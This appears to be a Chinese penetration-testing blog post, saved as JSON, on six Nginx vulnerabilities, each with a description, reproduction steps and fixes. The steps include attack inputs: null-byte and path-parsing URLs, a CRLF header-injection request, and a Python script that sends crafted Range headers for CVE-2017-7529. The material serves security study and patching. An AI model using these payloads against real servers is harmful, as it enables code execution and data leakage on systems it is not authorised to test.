{"title":"Nginx漏洞","uid":"bd8f109f788216dc7b6a90406caac8fe","slug":"Nginx漏洞","date":"2021-10-09T12:23:40.945Z","updated":"2021-10-09T12:23:26.753Z","comments":true,"path":"api/articles/Nginx漏洞.json","keywords":null,"cover":[],"content":"<p>Nginx是一款轻量级的Web 服务器/反向代理服务器及电子邮件（IMAP/POP3）代理服务器，在BSD-like协议下发行。其特点是占有内存少，并发能力强，事实上nginx的并发能力确实在同类型的网页服务器中表现较好。</p>\n<h1 id=\"一、文件解析漏洞\"><a href=\"#一、文件解析漏洞\" class=\"headerlink\" title=\"一、文件解析漏洞\"></a>一、文件解析漏洞</h1><h2 id=\"1-1、漏洞描述\"><a href=\"#1-1、漏洞描述\" class=\"headerlink\" title=\"1.1、漏洞描述\"></a>1.1、漏洞描述</h2><pre><code>    该漏洞是由于Nginx中php配置不当而造成的，与Nginx版本无关，但在高版本的php中，由于security.limit_extensions的引入，使得该漏洞难以被成功利用。\n\n    在已经上传了恶意1.jpg文件后，访问/1.jpg/xxx.php，（路径修复cgi.fix_pathinfo=1后）使得Nginx将其解析为php文件传给php-cgi程序（传给路径位于SERVER[&quot;SCRIPT_FILENAME&quot;]，修复去除路径位于SERVER[&quot;PATH_INFO&quot;]），但cgi程序将其解析为1.jpg并执行。\n</code></pre>\n<h2 id=\"1-2、漏洞复现\"><a href=\"#1-2、漏洞复现\" class=\"headerlink\" title=\"1.2、漏洞复现\"></a>1.2、漏洞复现</h2><p>使用phpstudy nginx php5.2.7</p>\n<p><img src=\"https://tcs.teambition.net/storage/312a52f8297cdb37d0528cfc41362a705709?Signature=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJBcHBJRCI6IjU5Mzc3MGZmODM5NjMyMDAyZTAzNThmMSIsIl9hcHBJZCI6IjU5Mzc3MGZmODM5NjMyMDAyZTAzNThmMSIsIl9vcmdhbml6YXRpb25JZCI6IjVmNzE4MmIzODI1NWU3ZjU1MzkyOThjNiIsImV4cCI6MTYzMzc4MjQwOSwiaWF0IjoxNjMzNzc4ODA5LCJyZXNvdXJjZSI6Ii9zdG9yYWdlLzMxMmE1MmY4Mjk3Y2RiMzdkMDUyOGNmYzQxMzYyYTcwNTcwOSJ9.dLeIThcmAXfEJMCSW6q-BdyHP4puPH8aCn_GslEkBWc&download=image.png\"></p>\n<p><img src=\"https://tcs.teambition.net/storage/312a28d4eee3f9ae9640bb3b63ce7853f026?Signature=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJBcHBJRCI6IjU5Mzc3MGZmODM5NjMyMDAyZTAzNThmMSIsIl9hcHBJZCI6IjU5Mzc3MGZmODM5NjMyMDAyZTAzNThmMSIsIl9vcmdhbml6YXRpb25JZCI6IjVmNzE4MmIzODI1NWU3ZjU1MzkyOThjNiIsImV4cCI6MTYzMzc4MjQxNCwiaWF0IjoxNjMzNzc4ODE0LCJyZXNvdXJjZSI6Ii9zdG9yYWdlLzMxMmEyOGQ0ZWVlM2Y5YWU5NjQwYmIzYjYzY2U3ODUzZjAyNiJ9.yQjtjQL8k9ccBBlyDiro68A5SzHjdauTvl0YaAFQr_c&download=image.png\"></p>\n<p>Nginx的处理程序和FastCGI处理程序不同导致</p>\n<p>Nginx拿到URI为/1.jpg/xxx.php后，识别处后缀是.php，认为是php文件，转交给PHP FastCGI处理程序去处理。PHP FastCGI处理程序识别该URI： /1.jpg/xxx.php不存在，按照PHP FastCGI处理程序自己的规则，删去最后的/xxx.php，又看/1.jpg存在，就将/1.jpg当成要执行的文件，就成功解析。</p>\n<p>Nginx传送给PHP FastCGI处理程序的路径可以在phpinfo中查看【传送路径查看】</p>\n<p><img src=\"https://tcs.teambition.net/storage/312a4ca58d049236bb1a4fd9d540dd786028?Signature=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJBcHBJRCI6IjU5Mzc3MGZmODM5NjMyMDAyZTAzNThmMSIsIl9hcHBJZCI6IjU5Mzc3MGZmODM5NjMyMDAyZTAzNThmMSIsIl9vcmdhbml6YXRpb25JZCI6IjVmNzE4MmIzODI1NWU3ZjU1MzkyOThjNiIsImV4cCI6MTYzMzc4MjQ4NCwiaWF0IjoxNjMzNzc4ODg0LCJyZXNvdXJjZSI6Ii9zdG9yYWdlLzMxMmE0Y2E1OGQwNDkyMzZiYjFhNGZkOWQ1NDBkZDc4NjAyOCJ9.Yo2j1OCPt0TUoc-l_EcKTF8Wv6eiKd0_cPkOXs7Uhd4&download=image.png\"></p>\n<p>cgi.fix_pathinfo为php中的一个选项，默认开启为1，作用为修理路径，也就是对路径URI的处理规</p>\n<p><img src=\"https://tcs.teambition.net/storage/312a3df8b47cc4dc1f66580b1ca132aa2910?Signature=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJBcHBJRCI6IjU5Mzc3MGZmODM5NjMyMDAyZTAzNThmMSIsIl9hcHBJZCI6IjU5Mzc3MGZmODM5NjMyMDAyZTAzNThmMSIsIl9vcmdhbml6YXRpb25JZCI6IjVmNzE4MmIzODI1NWU3ZjU1MzkyOThjNiIsImV4cCI6MTYzMzc4MjQ5NywiaWF0IjoxNjMzNzc4ODk3LCJyZXNvdXJjZSI6Ii9zdG9yYWdlLzMxMmEzZGY4YjQ3Y2M0ZGMxZjY2NTgwYjFjYTEzMmFhMjkxMCJ9.Qu3SimevNg-Y5TjYCoPA-rCTqsWVQ0q_6KluB_JPJLk&download=image.png\"></p>\n<p>当php遇到文件路劲为/1.jpg/xxx.php/ss.001时，该文件不存在，会删除最后的/ss.001，再判断/1.jpg/xxx.php是否存在，若存在则将/1.jpg/xxx.php当作/1.jpg/xxx.php/ss.001文件，若不存在，则继续删除最后一个路径。删除的多余路径会存在PATH_INFO中，在这里为ss.001</p>\n<p><img src=\"https://tcs.teambition.net/storage/312a18070c064e87bbac5e163d8cfe54e0a8?Signature=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJBcHBJRCI6IjU5Mzc3MGZmODM5NjMyMDAyZTAzNThmMSIsIl9hcHBJZCI6IjU5Mzc3MGZmODM5NjMyMDAyZTAzNThmMSIsIl9vcmdhbml6YXRpb25JZCI6IjVmNzE4MmIzODI1NWU3ZjU1MzkyOThjNiIsImV4cCI6MTYzMzc4MjUxNiwiaWF0IjoxNjMzNzc4OTE2LCJyZXNvdXJjZSI6Ii9zdG9yYWdlLzMxMmExODA3MGMwNjRlODdiYmFjNWUxNjNkOGNmZTU0ZTBhOCJ9.s9SY9blcUKwZYl6W3LL0P5N3eSUtd7tJRMaPX0xOPaQ&download=image.png\"></p>\n<h2 id=\"1-3、漏洞修复\"><a href=\"#1-3、漏洞修复\" class=\"headerlink\" title=\"1.3、漏洞修复\"></a>1.3、漏洞修复</h2><pre><code>    1、 将php.ini文件中的cgi.fix_pathinfo的值设置为0,这样php再解析1.php/1.jpg这样的目录时,只要1.jpg不存在就会显示404页面\n\n    2、 php-fpm.conf中的security.limit_extensions后面的值设置为.php\n</code></pre>\n<h1 id=\"二、目录遍历漏洞\"><a href=\"#二、目录遍历漏洞\" class=\"headerlink\" title=\"二、目录遍历漏洞\"></a>二、目录遍历漏洞</h1><h2 id=\"2-1、漏洞描述\"><a href=\"#2-1、漏洞描述\" class=\"headerlink\" title=\"2.1、漏洞描述\"></a>2.1、漏洞描述</h2><p>Nginx的目录遍历与apache一样,属于配置方面的问题,错误的配置可导致目录遍历与源码泄露。</p>\n<h2 id=\"2-2、漏洞复现\"><a href=\"#2-2、漏洞复现\" class=\"headerlink\" title=\"2.2、漏洞复现\"></a>2.2、漏洞复现</h2><p>修改nginx.conf,在如下图位置添加autoindex on</p>\n<pre class=\"line-numbers language-text\" data-language=\"text\"><code class=\"language-text\">autoindex on;<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n\n<p>autoindex on 开启目录浏览 autoindex off关闭目录浏览 默认是关闭状态</p>\n<p><img src=\"https://tcs.teambition.net/storage/312a656c6f063bc1b787a2f548d603167f90?Signature=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJBcHBJRCI6IjU5Mzc3MGZmODM5NjMyMDAyZTAzNThmMSIsIl9hcHBJZCI6IjU5Mzc3MGZmODM5NjMyMDAyZTAzNThmMSIsIl9vcmdhbml6YXRpb25JZCI6IjVmNzE4MmIzODI1NWU3ZjU1MzkyOThjNiIsImV4cCI6MTYzMzc4MjgxOCwiaWF0IjoxNjMzNzc5MjE4LCJyZXNvdXJjZSI6Ii9zdG9yYWdlLzMxMmE2NTZjNmYwNjNiYzFiNzg3YTJmNTQ4ZDYwMzE2N2Y5MCJ9.XhDRZiZIWxB4hKuw1VmAfRFUiAKkYP8nc1c5ToMqpWk&download=image.png\"></p>\n<h2 id=\"2-3、漏洞修复\"><a href=\"#2-3、漏洞修复\" class=\"headerlink\" title=\"2.3、漏洞修复\"></a>2.3、漏洞修复</h2><pre><code>    1.设置 autoindex off 关闭目录浏览\n\n    2.删除 autoindex on\n</code></pre>\n<h1 id=\"三、空字节代码执行漏洞\"><a href=\"#三、空字节代码执行漏洞\" class=\"headerlink\" title=\"三、空字节代码执行漏洞\"></a>三、空字节代码执行漏洞</h1><h2 id=\"3-1漏洞描述\"><a href=\"#3-1漏洞描述\" class=\"headerlink\" title=\"3.1漏洞描述\"></a>3.1漏洞描述</h2><p>在使用PHP-FastCGI执行php的时候，URL里面在遇到%00空字节时与FastCGI处理不一致，导致可在非php文件中嵌入php代码，通过访问url+%00.php来执行其中的php代码。如：<a href=\"http://local/robots.txt.php%E4%BC%9A%E6%8A%8Arobots.txt%E6%96%87%E4%BB%B6%E5%BD%93%E4%BD%9Cphp%E6%9D%A5%E6%89%A7%E8%A1%8C%E3%80%82\">http://local/robots.txt.php会把robots.txt文件当作php来执行。</a></p>\n<p>影响版本：</p>\n<pre class=\"line-numbers language-text\" data-language=\"text\"><code class=\"language-text\">nginx 0.5.* \nnginx 0.6.* \nnginx 0.7 &lt;= 0.7.65 \nnginx 0.8 &lt;= 0.8.37<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span></span></code></pre>\n\n<h2 id=\"3-2漏洞复现\"><a href=\"#3-2漏洞复现\" class=\"headerlink\" title=\"3.2漏洞复现\"></a>3.2漏洞复现</h2><p>开启nginx</p>\n<p><img src=\"https://tcs.teambition.net/storage/312a73915ce3a23ed25e76276c6d6f548419?Signature=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJBcHBJRCI6IjU5Mzc3MGZmODM5NjMyMDAyZTAzNThmMSIsIl9hcHBJZCI6IjU5Mzc3MGZmODM5NjMyMDAyZTAzNThmMSIsIl9vcmdhbml6YXRpb25JZCI6IjVmNzE4MmIzODI1NWU3ZjU1MzkyOThjNiIsImV4cCI6MTYzMzc4MzAwNCwiaWF0IjoxNjMzNzc5NDA0LCJyZXNvdXJjZSI6Ii9zdG9yYWdlLzMxMmE3MzkxNWNlM2EyM2VkMjVlNzYyNzZjNmQ2ZjU0ODQxOSJ9.hagawt542d7aVfRr4VtyyW7YK57yg82z3NeTI4F35Cc&download=image.png\"></p>\n<p>在网站目录下添加1.jpg文件</p>\n<p><img src=\"https://tcs.teambition.net/storage/312a427741af34c05e20a3cd7e37ebbeab74?Signature=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJBcHBJRCI6IjU5Mzc3MGZmODM5NjMyMDAyZTAzNThmMSIsIl9hcHBJZCI6IjU5Mzc3MGZmODM5NjMyMDAyZTAzNThmMSIsIl9vcmdhbml6YXRpb25JZCI6IjVmNzE4MmIzODI1NWU3ZjU1MzkyOThjNiIsImV4cCI6MTYzMzc4MzAxOCwiaWF0IjoxNjMzNzc5NDE4LCJyZXNvdXJjZSI6Ii9zdG9yYWdlLzMxMmE0Mjc3NDFhZjM0YzA1ZTIwYTNjZDdlMzdlYmJlYWI3NCJ9.n5LbRysImySeWlFVAVUxFKYrMGbKAOJxS2n_tqrBwqQ&download=image.png\"></p>\n<p>访问该文件</p>\n<p><img src=\"https://tcs.teambition.net/storage/312a106ed69bc7716120483436e206db70d9?Signature=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJBcHBJRCI6IjU5Mzc3MGZmODM5NjMyMDAyZTAzNThmMSIsIl9hcHBJZCI6IjU5Mzc3MGZmODM5NjMyMDAyZTAzNThmMSIsIl9vcmdhbml6YXRpb25JZCI6IjVmNzE4MmIzODI1NWU3ZjU1MzkyOThjNiIsImV4cCI6MTYzMzc4MzAzMCwiaWF0IjoxNjMzNzc5NDMwLCJyZXNvdXJjZSI6Ii9zdG9yYWdlLzMxMmExMDZlZDY5YmM3NzE2MTIwNDgzNDM2ZTIwNmRiNzBkOSJ9.vvAspS4gEa3n8hLK-n42CkxGD2pHnDOtnI59oTOcDJ4&download=image.png\"></p>\n<p>4）抓包，添加%00</p>\n<p>这里由于该图非正常，在抓包时最后面添加..，可以让burpsuite抓到</p>\n<p><img src=\"https://tcs.teambition.net/storage/312afd7d4c4cc7da469dea10ee42b07316ea?Signature=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJBcHBJRCI6IjU5Mzc3MGZmODM5NjMyMDAyZTAzNThmMSIsIl9hcHBJZCI6IjU5Mzc3MGZmODM5NjMyMDAyZTAzNThmMSIsIl9vcmdhbml6YXRpb25JZCI6IjVmNzE4MmIzODI1NWU3ZjU1MzkyOThjNiIsImV4cCI6MTYzMzc4MzA0MiwiaWF0IjoxNjMzNzc5NDQyLCJyZXNvdXJjZSI6Ii9zdG9yYWdlLzMxMmFmZDdkNGM0Y2M3ZGE0NjlkZWExMGVlNDJiMDczMTZlYSJ9.RR1CyPqaIbDuN9ijj2l0jzQLCFSwpQcXx6UGoZiASfI&download=image.png\"></p>\n<p>将请求修改为</p>\n<pre class=\"line-numbers language-text\" data-language=\"text\"><code class=\"language-text\">/1.jpg..php<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n\n<p><img src=\"https://tcs.teambition.net/storage/312a4847c650e79f5349b619c41032ca7773?Signature=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJBcHBJRCI6IjU5Mzc3MGZmODM5NjMyMDAyZTAzNThmMSIsIl9hcHBJZCI6IjU5Mzc3MGZmODM5NjMyMDAyZTAzNThmMSIsIl9vcmdhbml6YXRpb25JZCI6IjVmNzE4MmIzODI1NWU3ZjU1MzkyOThjNiIsImV4cCI6MTYzMzc4MzA2MywiaWF0IjoxNjMzNzc5NDYzLCJyZXNvdXJjZSI6Ii9zdG9yYWdlLzMxMmE0ODQ3YzY1MGU3OWY1MzQ5YjYxOWM0MTAzMmNhNzc3MyJ9.32ZSQP849v1Z52nSCKpOViyMXsQayXF2nnf5O3wEGj4&download=image.png\"></p>\n<p>发包即可</p>\n<p><img src=\"https://tcs.teambition.net/storage/312af0079a84016d9820542c659ff931fbe2?Signature=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJBcHBJRCI6IjU5Mzc3MGZmODM5NjMyMDAyZTAzNThmMSIsIl9hcHBJZCI6IjU5Mzc3MGZmODM5NjMyMDAyZTAzNThmMSIsIl9vcmdhbml6YXRpb25JZCI6IjVmNzE4MmIzODI1NWU3ZjU1MzkyOThjNiIsImV4cCI6MTYzMzc4MzA3NCwiaWF0IjoxNjMzNzc5NDc0LCJyZXNvdXJjZSI6Ii9zdG9yYWdlLzMxMmFmMDA3OWE4NDAxNmQ5ODIwNTQyYzY1OWZmOTMxZmJlMiJ9.sk_1g4va12YR9eWbwQQ9BBQzeYkc_lnXnVWHV3Bqgwo&download=image.png\"></p>\n<h2 id=\"3-3、漏洞修复\"><a href=\"#3-3、漏洞修复\" class=\"headerlink\" title=\"3.3、漏洞修复\"></a>3.3、漏洞修复</h2><p>1.在nginx虚拟机配置或者fcgi.conf配置加如下代码：</p>\n<pre class=\"line-numbers language-text\" data-language=\"text\"><code class=\"language-text\">if ($request_filename ~* (.*)\\.php) &#123; \nset $php_url $1; \n&#125;\nif (!-e $php_url.php) &#123; \nreturn 403; \n&#125;<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<p>2.升级 nginx</p>\n<h1 id=\"四、整数溢处漏洞（CVE-2017-7529）\"><a href=\"#四、整数溢处漏洞（CVE-2017-7529）\" class=\"headerlink\" title=\"四、整数溢处漏洞（CVE-2017-7529）\"></a>四、整数溢处漏洞（CVE-2017-7529）</h1><h2 id=\"4-1漏洞描述\"><a href=\"#4-1漏洞描述\" class=\"headerlink\" title=\"4.1漏洞描述\"></a>4.1漏洞描述</h2><p>在 Nginx 的 range filter 中存在整数溢出漏洞，可以通过带有特殊构造的 range 的 HTTP 头的恶意请求引发这个整数溢出漏洞，并导致信息泄露。</p>\n<p>该漏洞影响所有 0.5.6 - 1.13.2版本内默认配置模块的Nginx只需要开启缓存攻击者即可发送恶意请求进行远程攻击造成信息泄露。当Nginx服务器使用代理缓存的情况下攻击者通过利用该漏洞可以拿到服务器的后端真实IP或其他敏感信息。</p>\n<p>通过我们的分析判定该漏洞利用难度低可以归属于low-hanging-fruit的漏洞在真实网络攻击中也有一定利用价值。</p>\n<h2 id=\"4-2漏洞复现\"><a href=\"#4-2漏洞复现\" class=\"headerlink\" title=\"4.2漏洞复现\"></a>4.2漏洞复现</h2><p><a href=\"https://github.com/vulhub/vulhub/tree/master/nginx/CVE-2017-7529\">https://github.com/vulhub/vulhub/tree/master/nginx/CVE-2017-7529</a></p>\n<p>检测脚本</p>\n<pre class=\"line-numbers language-text\" data-language=\"text\"><code class=\"language-text\">#!/usr/bin/env python \nimport sys \nimport requests \n\nif len(sys.argv) &lt; 2: \n\tprint(\"%s url\" % (sys.argv[0])) \n\tprint(\"eg: python %s http://your-ip:8080/\" % (sys.argv[0])) \n\tsys.exit() \nheaders = &#123; \n\t'User-Agent': \"Mozilla/5.0 (Windows NT 10.0) AppleWebKit/537.36 (KHTML, like \nGecko) Chrome/42.0.2311.135 Safari/537.36 Edge/12.10240\" \n&#125;\noffset = 605 \nurl = sys.argv[1] \nfile_len = len(requests.get(url, headers=headers).content) \nn = file_len + offset \nheaders['Range'] = \"bytes=-%d,-%d\" % ( \n\tn, 0x8000000000000000 - n) \nr = requests.get(url, headers=headers) <span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<h2 id=\"4-3漏洞修复\"><a href=\"#4-3漏洞修复\" class=\"headerlink\" title=\"4.3漏洞修复\"></a>4.3漏洞修复</h2><p>升级版本</p>\n<h1 id=\"五、CRLF注入漏洞\"><a href=\"#五、CRLF注入漏洞\" class=\"headerlink\" title=\"五、CRLF注入漏洞\"></a>五、CRLF注入漏洞</h1><h2 id=\"5-1漏洞描述\"><a href=\"#5-1漏洞描述\" class=\"headerlink\" title=\"5.1漏洞描述\"></a>5.1漏洞描述</h2><p>Nginx将传入的url进行解码，对其中的%0a%0d替换成换行符，导致后面的数据注入至头部，造成CRLF注入漏洞。</p>\n<h2 id=\"5-2漏洞复现\"><a href=\"#5-2漏洞复现\" class=\"headerlink\" title=\"5.2漏洞复现\"></a>5.2漏洞复现</h2><p>设置https跳转，这样就可以接收到url，进而进行处理。在</p>\n<p>C:\\phpStudy\\PHPTutorial\\nginx\\conf\\nginx.conf文件中添加下面一行话。</p>\n<pre class=\"line-numbers language-text\" data-language=\"text\"><code class=\"language-text\">location / &#123; \n\treturn 302 https://$host$uri; \n&#125;<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span></span></code></pre>\n\n<p><img src=\"https://tcs.teambition.net/storage/312a05a346289ebb0630a2dbd10870a277f2?Signature=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJBcHBJRCI6IjU5Mzc3MGZmODM5NjMyMDAyZTAzNThmMSIsIl9hcHBJZCI6IjU5Mzc3MGZmODM5NjMyMDAyZTAzNThmMSIsIl9vcmdhbml6YXRpb25JZCI6IjVmNzE4MmIzODI1NWU3ZjU1MzkyOThjNiIsImV4cCI6MTYzMzc4NTU1NSwiaWF0IjoxNjMzNzgxOTU1LCJyZXNvdXJjZSI6Ii9zdG9yYWdlLzMxMmEwNWEzNDYyODllYmIwNjMwYTJkYmQxMDg3MGEyNzdmMiJ9.8FCDV1SkjG4vNhqMFfxvYa6OM2S5-GwlMiee6WTVpKU&download=image.png\"></p>\n<p>构造url，访问</p>\n<p><a href=\"http://192.168.0.155/%0ASet-cookie:JSPSESSID%3D3\">http://192.168.0.155/%0ASet-cookie:JSPSESSID%3D3</a></p>\n<pre class=\"line-numbers language-text\" data-language=\"text\"><code class=\"language-text\">GET /%0ASet-cookie:JSPSESSID%3D3 HTTP/1.1 \nHost: 192.168.0.155 \nUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:91.0) Gecko/20100101 \nFirefox/91.0 \nAccept: \ntext/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8 \nAccept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2 \nAccept-Encoding: gzip, deflate \nConnection: close \nUpgrade-Insecure-Requests: 1 \nCache-Control: max-age=0<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<p><img src=\"https://tcs.teambition.net/storage/312a3f5007f9fcce56bf659aeab84798d1b6?Signature=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJBcHBJRCI6IjU5Mzc3MGZmODM5NjMyMDAyZTAzNThmMSIsIl9hcHBJZCI6IjU5Mzc3MGZmODM5NjMyMDAyZTAzNThmMSIsIl9vcmdhbml6YXRpb25JZCI6IjVmNzE4MmIzODI1NWU3ZjU1MzkyOThjNiIsImV4cCI6MTYzMzc4NTU3NSwiaWF0IjoxNjMzNzgxOTc1LCJyZXNvdXJjZSI6Ii9zdG9yYWdlLzMxMmEzZjUwMDdmOWZjY2U1NmJmNjU5YWVhYjg0Nzk4ZDFiNiJ9.NOPD0Dr7Gbk03LgBqj0Xe0XQg5HeB1KWN9yIVCRGxZM&download=image.png\"></p>\n<h2 id=\"5-3漏洞修复\"><a href=\"#5-3漏洞修复\" class=\"headerlink\" title=\"5.3漏洞修复\"></a>5.3漏洞修复</h2><p>1、删除配置不当的配置</p>\n<h1 id=\"六、文件名逻辑漏洞（CVE-2013-4547）\"><a href=\"#六、文件名逻辑漏洞（CVE-2013-4547）\" class=\"headerlink\" title=\"六、文件名逻辑漏洞（CVE-2013-4547）\"></a>六、文件名逻辑漏洞（CVE-2013-4547）</h1><h2 id=\"6-1漏洞描述\"><a href=\"#6-1漏洞描述\" class=\"headerlink\" title=\"6.1漏洞描述\"></a>6.1漏洞描述</h2><p>这一漏洞的原理是非法字符空格和截止符（\\0）会导致Nginx解析URI时的有限状态机混乱，此漏洞可导致目录跨越及代码执行，其影响版本为：nginx 0.8.41 – 1.5.6</p>\n<h2 id=\"6-2漏洞复现\"><a href=\"#6-2漏洞复现\" class=\"headerlink\" title=\"6.2漏洞复现\"></a>6.2漏洞复现</h2><p>创建 1.jpg 文件，并上传</p>\n<p>抓包，在该文件最后添加一个空</p>\n<p><img src=\"https://tcs.teambition.net/storage/312abbf638830154c06a8f756918336ff020?Signature=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJBcHBJRCI6IjU5Mzc3MGZmODM5NjMyMDAyZTAzNThmMSIsIl9hcHBJZCI6IjU5Mzc3MGZmODM5NjMyMDAyZTAzNThmMSIsIl9vcmdhbml6YXRpb25JZCI6IjVmNzE4MmIzODI1NWU3ZjU1MzkyOThjNiIsImV4cCI6MTYzMzc4NTY2MiwiaWF0IjoxNjMzNzgyMDYyLCJyZXNvdXJjZSI6Ii9zdG9yYWdlLzMxMmFiYmY2Mzg4MzAxNTRjMDZhOGY3NTY5MTgzMzZmZjAyMCJ9.3H1-QjPj6IagG0cYTx1ubdiGvn-7XRHITT5j2dj5JIs&download=image.png\"></p>\n<p>可以看到上传成功</p>\n<p><img src=\"https://tcs.teambition.net/storage/312a5971632aa96c4678bc2bc824a0123e3c?Signature=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJBcHBJRCI6IjU5Mzc3MGZmODM5NjMyMDAyZTAzNThmMSIsIl9hcHBJZCI6IjU5Mzc3MGZmODM5NjMyMDAyZTAzNThmMSIsIl9vcmdhbml6YXRpb25JZCI6IjVmNzE4MmIzODI1NWU3ZjU1MzkyOThjNiIsImV4cCI6MTYzMzc4NTY3MCwiaWF0IjoxNjMzNzgyMDcwLCJyZXNvdXJjZSI6Ii9zdG9yYWdlLzMxMmE1OTcxNjMyYWE5NmM0Njc4YmMyYmM4MjRhMDEyM2UzYyJ9.hThR23YKAgeO-tErUVKw8Y7x8EvkgIMhNHwWdYCROiY&download=image.png\"></p>\n<p>访问该文件，burpbuite抓包处理</p>\n<p>访问URL：<a href=\"http://192.168.112.111/1.jpg...php\">http://192.168.112.111/1.jpg...php</a></p>\n<p>在burp的hex页面中将第一个点.改成20，第二个改为00</p>\n<p><img src=\"https://tcs.teambition.net/storage/312ab2d8fc3cdb9216b11a73c557186e6504?Signature=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJBcHBJRCI6IjU5Mzc3MGZmODM5NjMyMDAyZTAzNThmMSIsIl9hcHBJZCI6IjU5Mzc3MGZmODM5NjMyMDAyZTAzNThmMSIsIl9vcmdhbml6YXRpb25JZCI6IjVmNzE4MmIzODI1NWU3ZjU1MzkyOThjNiIsImV4cCI6MTYzMzc4NTY3OCwiaWF0IjoxNjMzNzgyMDc4LCJyZXNvdXJjZSI6Ii9zdG9yYWdlLzMxMmFiMmQ4ZmMzY2RiOTIxNmIxMWE3M2M1NTcxODZlNjUwNCJ9.f1G8GlK7Rq74ed84HxuuL03moRiVMwEZX_u1WqQNcvw&download=image.png\"></p>\n<h2 id=\"6-3漏洞修复\"><a href=\"#6-3漏洞修复\" class=\"headerlink\" title=\"6.3漏洞修复\"></a>6.3漏洞修复</h2><p>1.升级nginx</p>\n","text":"Nginx是一款轻量级的Web 服务器/反向代理服务器及电子邮件（IMAP/POP3）代理服务器，在BSD-like协议下发行。其特点是占有内存少，并发能力强，事实上nginx的并发能力确实在同类型的网页服务器中表现较好。 一、文件解析漏洞1.1、漏洞描述 该漏洞是由于Nginx...","link":"","photos":[],"count_time":{"symbolsCount":"3.8k","symbolsTime":"3 mins."},"categories":[{"name":"渗透测试","slug":"渗透测试","count":9,"path":"api/categories/渗透测试.json"}],"tags":[{"name":"渗透测试","slug":"渗透测试","count":9,"path":"api/tags/渗透测试.json"}],"toc":"<ol class=\"toc\"><li class=\"toc-item toc-level-1\"><a class=\"toc-link\" href=\"#%E4%B8%80%E3%80%81%E6%96%87%E4%BB%B6%E8%A7%A3%E6%9E%90%E6%BC%8F%E6%B4%9E\"><span class=\"toc-text\">一、文件解析漏洞</span></a><ol class=\"toc-child\"><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#1-1%E3%80%81%E6%BC%8F%E6%B4%9E%E6%8F%8F%E8%BF%B0\"><span class=\"toc-text\">1.1、漏洞描述</span></a></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#1-2%E3%80%81%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0\"><span class=\"toc-text\">1.2、漏洞复现</span></a></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#1-3%E3%80%81%E6%BC%8F%E6%B4%9E%E4%BF%AE%E5%A4%8D\"><span class=\"toc-text\">1.3、漏洞修复</span></a></li></ol></li><li class=\"toc-item toc-level-1\"><a class=\"toc-link\" href=\"#%E4%BA%8C%E3%80%81%E7%9B%AE%E5%BD%95%E9%81%8D%E5%8E%86%E6%BC%8F%E6%B4%9E\"><span class=\"toc-text\">二、目录遍历漏洞</span></a><ol class=\"toc-child\"><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#2-1%E3%80%81%E6%BC%8F%E6%B4%9E%E6%8F%8F%E8%BF%B0\"><span class=\"toc-text\">2.1、漏洞描述</span></a></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#2-2%E3%80%81%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0\"><span class=\"toc-text\">2.2、漏洞复现</span></a></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#2-3%E3%80%81%E6%BC%8F%E6%B4%9E%E4%BF%AE%E5%A4%8D\"><span class=\"toc-text\">2.3、漏洞修复</span></a></li></ol></li><li class=\"toc-item toc-level-1\"><a class=\"toc-link\" href=\"#%E4%B8%89%E3%80%81%E7%A9%BA%E5%AD%97%E8%8A%82%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E\"><span class=\"toc-text\">三、空字节代码执行漏洞</span></a><ol class=\"toc-child\"><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#3-1%E6%BC%8F%E6%B4%9E%E6%8F%8F%E8%BF%B0\"><span class=\"toc-text\">3.1漏洞描述</span></a></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#3-2%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0\"><span class=\"toc-text\">3.2漏洞复现</span></a></li><li 